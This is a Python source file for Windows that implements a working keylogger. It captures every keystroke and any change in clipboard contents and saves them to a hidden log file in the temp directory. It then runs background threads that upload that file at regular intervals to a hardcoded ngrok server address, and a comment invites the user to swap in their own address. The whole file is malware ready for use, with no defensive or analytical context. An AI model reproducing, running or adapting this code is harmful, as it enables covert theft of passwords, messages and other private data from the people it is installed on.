# Windows


# import modules
from tempfile import gettempdir
from os import system,name
from os.path import isfile,exists
import threading
from pynput import keyboard
from pyperclip import paste   # for getting the clipboard data (supports cross platform)  
from datetime import datetime
from time import sleep
from requests import post


# <-- Initializing global values -->

# change this
SERVER_ADDRESS = 'https://bcd4-103-55-96-137.ngrok-free.app/upload'         # replace the Address
INTERVAL = 10                                                               # set interval according to your requirement



# <---  no change required   --->
duplicate = ['']

# Windows
temp_dir = gettempdir()
FILENAME = f'{temp_dir}\\{datetime.now().strftime(".%d%m%Y%H%M%S")}.log'


#keystroke record
class keylogger:

    # init
    def __init__(self):
        pass

    # saving the file
    def savefile(self,data):
        try:
            file_exists = isfile(FILENAME)

            with open(FILENAME,'a+') as fh:
                fh.write(str(data))
            
            if not file_exists and name == 'nt':  # check if the system is Windows and file didn't exist before
                system(f'attrib +h {FILENAME}')
        except:
            pass
    

    def Keylogging(self):
        def on_key_press(key):
            try:
                # to get the clipboard data
                data = paste()

                if data != duplicate[0]:
                    self.savefile(f'Clipboard data: {data}\n')
                    duplicate[0] = data

                # logging the keystrokes
                self.savefile(f'{str(key)}\n')

            except:
                pass


        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()


    # destructor
    def __del__(self):
        pass


# send the file to the http server at regular interval
class uploader:
    
    # init
    def __init__(self):
        pass
    
    def upload_file_periodically(self):
        
        sleep(INTERVAL)
        
        while True:
            try:
                if exists(FILENAME):
                    with open(FILENAME, 'rb') as fh:
                        files = {'file': fh}

                        post(SERVER_ADDRESS, files=files)   # sending the file

                else:
                    pass  # file not created/found

                sleep(INTERVAL)

            except:
                pass

    def __del__(self):
        pass




if __name__=='__main__':
    try:
        # creating objects
        keylogger  = keylogger()
        uploader = uploader()

        # <---  implementing threading  ---> 
       
        # starting the keylogger and daemon = True (to run it in the background)
        keylogger_thread = threading.Thread(target = keylogger.Keylogging,daemon = True)
        keylogger_thread.start() 


        # sending file periodically and daemon = True (to run it in the background)
        uploader_thread = threading.Thread(target = uploader.upload_file_periodically, daemon = True)
        uploader_thread.start()


        keylogger_thread.join()
        uploader_thread.join()   
    
    except KeyboardInterrupt:
        pass
